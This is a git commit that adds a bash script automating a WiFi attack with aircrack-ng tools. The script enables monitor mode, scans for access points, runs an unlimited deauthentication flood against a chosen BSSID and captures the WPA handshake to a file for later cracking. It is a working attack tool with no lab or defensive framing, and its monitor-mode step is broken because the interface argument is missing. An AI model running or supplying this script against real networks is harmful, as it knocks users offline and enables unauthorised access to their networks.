ca5ed8773b2807f6b31730788eb07500928f025f
sacheex <sachithdhanushka00@gmail.com>
2023-12-19 23:17:29 +0530

    Create handshakeCatcher.sh

---
+++ handshakeCatcher.sh
@@ -0,0 +1,41 @@
+#!/bin/bash
+
+# Kill processes
+sudo airmon-ng check kill
+
+echo "Enter network interface: "
+read interface
+
+# Start monitor mode
+sudo airmon-ng start
+
+# See network config
+iwconfig
+
+
+echo "Enter name of the interface that is on monitor mode: "
+read interface
+
+echo "Enter \"q\" two times to quite from capturing BSSID"
+sleep 1
+
+# Capturing BSSID
+sudo airodump-ng $interface
+
+echo "Enter BSSID : "
+read bssid
+
+echo "Enter Channel number: "
+read c
+
+echo "Enter file name save captured files: "
+read filename
+
+echo "Enter \"q\" two times to quite after capture Handshake"
+sleep 1
+
+# Deauthentication Attack
+gnome-terminal -- sudo aireplay-ng --deauth 0 -a $bssid $interface &
+
+# Capturing Handshake
+sudo airodump-ng -w $filename -c $c --bssid $bssid $interface
